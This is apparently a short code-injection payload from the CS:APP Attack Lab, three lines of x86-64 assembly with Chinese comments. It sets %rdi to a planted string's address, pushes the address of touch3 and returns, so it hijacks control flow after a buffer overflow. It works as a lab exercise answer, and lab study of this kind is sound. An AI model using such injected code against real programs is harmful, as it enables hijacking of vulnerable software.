movq $0x5561dca8, %rdi     # 参数1指向我们放在安全区的字符串
pushq $0x4018fa            # 压入 touch3 的入口地址
ret